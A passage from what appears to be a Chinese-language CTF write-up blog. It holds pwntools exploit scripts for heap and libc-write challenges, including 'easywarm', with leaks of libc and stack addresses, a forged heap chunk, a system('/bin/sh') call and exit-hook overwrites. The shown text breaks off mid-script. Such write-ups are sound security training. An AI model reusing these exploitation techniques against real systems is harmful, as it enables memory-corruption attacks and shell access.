sla(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> ans <span class="keyword">in</span> answers:</span><br><span class="line">        <span class="keyword">if</span> wait:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(ans) == <span class="built_in">int</span>:</span><br><span class="line">            sla(<span class="string">&quot;answer: &quot;</span>, <span class="built_in">str</span>(ans))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hint, nums = ans</span><br><span class="line">            sla(<span class="string">&quot;answer: &quot;</span>, hint)</span><br><span class="line">            <span class="keyword">if</span> hint == <span class="string">&quot;whos_your_daddy&quot;</span>:</span><br><span class="line">                sla(<span class="string">&quot;Input:&quot;</span>, <span class="built_in">str</span>(nums))</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    sla(<span class="string">&quot;name?&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">    sa(<span class="string">&quot;name!&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">prepare()</span><br><span class="line">add([<span class="number">0xFFFFFFFF</span>]*<span class="number">20</span>) <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment">#0</span></span><br><span class="line">exit()</span><br><span class="line">challenge([<span class="number">0x0</span>], <span class="string">&quot;d&quot;</span> * <span class="number">0x18</span>, <span class="literal">True</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0xb7870</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">prepare()</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment">#1</span></span><br><span class="line">exit()</span><br><span class="line">challenge([(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1228</span>),(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1221</span>)])</span><br><span class="line"></span><br><span class="line">prepare()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add([<span class="number">0x0</span>] * <span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, [<span class="number">0</span>] * <span class="number">12</span> + [<span class="number">0xdbeef010</span>, <span class="number">0xdea</span>, <span class="number">0x0</span>])</span><br><span class="line"></span><br><span class="line">system = libc_base + <span class="number">0x50a90</span></span><br><span class="line">add([<span class="number">0x6e69622f</span>, <span class="number">0x68732f</span>] + [<span class="number">0x0</span>] * <span class="number">8</span> + [<span class="number">0xdeadbeef</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbeefdead</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, system &amp; <span class="number">0xffffffff</span>, system &gt;&gt; <span class="number">32</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add([<span class="number">0x0</span>] * <span class="number">14</span>)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">stdout = libc_base + <span class="number">0xb4280</span></span><br><span class="line">base_address = libc_base + <span class="number">0xb7a90</span></span><br><span class="line">stdout_ptr = system + <span class="number">0x63920</span></span><br><span class="line">fake_chunk = libc_base + <span class="number">0xb7cc0</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;base_address &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(base_address))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;fake_chunk &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_chunk))</span><br><span class="line">success(<span class="string">&quot;stdout_ptr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stdout_ptr))</span><br><span class="line">success(<span class="string">&quot;break_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base + <span class="number">0x2AB17</span>))</span><br><span class="line"></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">last_value = (<span class="number">20</span> &lt;&lt; <span class="number">6</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">5</span>) | <span class="number">1</span> | (<span class="number">0xfff</span> &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">challenge([(<span class="string">&quot;next_next&quot;</span>, <span class="number">0</span>), (<span class="string">&quot;next_next&quot;</span>, <span class="number">0</span>),</span><br><span class="line">           <span class="number">0x0</span>, <span class="number">0x0</span>,</span><br><span class="line">           fake_chunk &amp; <span class="number">0xffffffff</span>, fake_chunk &gt;&gt; <span class="number">32</span>,  <span class="comment"># prev</span></span><br><span class="line">           stdout_ptr &amp; <span class="number">0xffffffff</span>, stdout_ptr &gt;&gt; <span class="number">32</span>,  <span class="comment"># next</span></span><br><span class="line">           base_address &amp; <span class="number">0xffffffff</span>, base_address &gt;&gt; <span class="number">32</span>,  <span class="comment"># group</span></span><br><span class="line">           <span class="number">0x2</span>, <span class="number">0x0</span>,  <span class="comment"># masks</span></span><br><span class="line">           last_value &amp; <span class="number">0xffffffff</span>, last_value &gt;&gt; <span class="number">32</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">prepare()</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">exit()</span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="easywarm"><a href="#easywarm" class="headerlink" title="easywarm"></a>easywarm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">easywarm: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=e708c2433f22dc346ad3b92573800150c429996f, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序总体上是实现了一个走迷宫的小游戏，漏洞比较难找</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sizeg / numg &gt; <span class="number">15</span> &amp;&amp; sizeg / numg &lt;= <span class="number">32</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; sizeg / numg / <span class="number">2</span>; ++i )</span><br><span class="line">    v3 = <span class="number">2</span> * v3 + <span class="number">1</span>;</span><br><span class="line">  v2 = v3 &amp; (<span class="keyword">unsigned</span> __int64)&amp;v2;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;flag: %lu\n&quot;</span>, v3 &amp; (<span class="keyword">unsigned</span> __int64)&amp;v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以泄露 stack_addr 的后4位</li>
</ul>
<p>程序设置了一个可疑的中断处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signal(<span class="number">8</span>, (<span class="keyword">__sighandler_t</span>)hander2);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(*(<span class="keyword">void</span> **)(key_buf.argv + <span class="number">8</span>), <span class="string">&quot;666&quot;</span>, <span class="number">3uLL</span>);</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">readlink(<span class="string">&quot;/proc/self/exe&quot;</span>, s, <span class="number">0xFF</span>uLL);</span><br><span class="line">execve(s, (<span class="keyword">char</span> *<span class="keyword">const</span> *)key_buf.argv, (<span class="keyword">char</span> *<span class="keyword">const</span> *)key_buf.env);</span><br></pre></td></tr></table></figure>
<p>找了半天也没弄懂该如何触发，最后在 nowork 中发现了端倪：（有一个除0操作被优化了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;This is a gift for you ^_^ ~&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;# system(\&quot;/aidai/ash\&quot;); exists here.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;# I think you must be able to get flag.&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>另外程序还有一处溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;key_buf, <span class="number">0</span>, sizeg / numg / <span class="number">2</span> + <span class="number">80</span>);</span><br><span class="line">readn(&amp;key_buf, sizeg / numg / <span class="number">2</span> + <span class="number">80</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>在 key_buf 中可以溢出2字节</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>为了触发 stack_addr 泄露，必须先解决迷宫问题：</p>
<p>提取迷宫数据时往往会因为单位字符的长度不同而提取出错，这里我选择用正则表达式解决这个问题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">maze = []</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    data = ru(<span class="string">&quot;\n&quot;</span>)[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line">    data = re.sub(<span class="string">&quot;🚩&quot;</span>,<span class="string">&quot;7&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;👴&quot;</span>,<span class="string">&quot;3&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;  &quot;</span>,<span class="string">&quot;1&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;██&quot;</span>,<span class="string">&quot;0&quot;</span>,data)</span><br><span class="line">    maze.append(data)</span><br></pre></td></tr></table></figure>
<p>走迷宫的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">v</span>):</span></span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])] + v + [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])]</span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> + i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line">    v = [<span class="built_in">list</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line"></span><br><span class="line">    x0, y0 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v[<span class="number">0</span>])):</span><br><span class="line">            <span class="keyword">if</span> v[x][y] == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                x0, y0 = x, y</span><br><span class="line">    v[x0][y0] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">    ans = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">ans, v, x, y</span>):</span></span><br><span class="line">        <span class="keyword">if</span> v[x][y] == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> v[x][y] != <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        v[x][y] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        action = [</span><br><span class="line">            [<span class="string">&#x27;w&#x27;</span>, x-<span class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;s&#x27;</span>, x+<span class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;a&#x27;</span>, x, y-<span class="number">1</span>],</span><br><span class="line">            [<span class="string">&#x27;d&#x27;</span>, x, y+<span class="number">1</span>],</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> ch, xx, yy <span class="keyword">in</span> action:</span><br><span class="line">            ans += [ch]</span><br><span class="line">            ok = dfs(ans, v, xx, yy)</span><br><span class="line">            <span class="keyword">if</span> ok:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            ans.pop()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    ok = dfs(ans, v, x0, y0)</span><br><span class="line">    <span class="keyword">return</span> ok, <span class="string">&#x27;&#x27;</span>.join(ans)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;LD_DEBUG=all&quot;</span></span><br><span class="line">sla(<span class="string">&quot;name: &quot;</span>,name)</span><br></pre></td></tr></table></figure>
<p>泄露栈地址后4字节后，配合2字节溢出覆盖 key_buf.env 低位，可以劫持环境变量到我们输入 name 的地方</p>
<p>看 wp 得知，设置环境变量 <code>LD_DEBUG=all</code>(12字节) 可以打印出 ld.so 加载库的时候的 log，因此可以得到 libc 的加载地址，效果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">13304</span>:    file=./libc<span class="number">-2.31</span>.so [<span class="number">0</span>];  needed by ./easywarm1 [<span class="number">0</span>]</span><br><span class="line"><span class="number">13304</span>:    file=./libc<span class="number">-2.31</span>.so [<span class="number">0</span>];  generating link <span class="built_in">map</span></span><br><span class="line"><span class="number">13304</span>:      dynamic: <span class="number">0x00007ffff7fbfb80</span>  base: <span class="number">0x00007ffff7dd5000</span>   size: <span class="number">0x00000000001f14d8</span></span><br><span class="line"><span class="number">13304</span>:        entry: <span class="number">0x00007ffff7dfc1f0</span>  phdr: <span class="number">0x00007ffff7dd5040</span>  phnum:                 <span class="number">14</span></span><br></pre></td></tr></table></figure>
<p>最后就是一个 libc 任意写，尝试打 exit_hook：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p rtld_lock_default_lock_recursive</span><br><span class="line">$<span class="number">1</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span> *)&#125; <span class="number">0x7ffff7fd0150</span> &lt;rtld_lock_default_lock_recursive&gt;</span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x7ffff7fd0150</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>P\x01\xfd\xf7\xff\x7f\x00\x00<span class="number">&#x27;</span></span><br><span class="line">ld<span class="number">-2.31</span>.so      <span class="number">0x7ffff7ffdf68</span> <span class="number">0x7ffff7fd0150</span></span><br></pre></td></tr></table></figure>
<p>PS：从 wp 中学到的，打 <code>__libc_atexit</code> 也是个不错的选择</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                               __libc_atexit segment qword <span class="keyword">public</span> <span class="string">&#x27;DATA&#x27;</span> use64</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                               assume cs:__libc_atexit</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                               ;org <span class="number">1</span>ED608h</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608 E0 <span class="number">5</span>E <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_1ED608 dq offset fcloseall_0        ; DATA XREF: sub_49930+<span class="number">1</span>DA↑o</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                                                                       ; sub_5EED0+<span class="number">1672</span>↑o</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                                                                       ; sub_5EED0+<span class="number">1E37</span>↑o</span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./easywarm1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([challenge,<span class="string">&quot;000&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x180A)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;[-]&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">num,size</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot; complexity: &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">    sla(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>(<span class="params">data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;input: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span>():</span></span><br><span class="line">    cmd(<span class="number">0x666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">v</span>):</span></span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])] + v + [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])]</span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> + i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line">    v = [<span class="built_in">list</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line"></span><br><span class="line">    x0, y0 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v[<span class="number">0</span>])):</span><br><span class="line">            <span class="keyword">if</span> v[x][y] == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                x0, y0 = x, y</span><br><span class="line">    v[x0][y0] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">    ans = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">ans, v, x, y</span>):</span></span><br><span class="line">        <span class="keyword">if</span> v[x][y] == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> v[x][y] != <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        v[x][y] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        action = [</span><br><span class="line">            [<span class="string">&#x27;w&#x27;</span>, x-<span 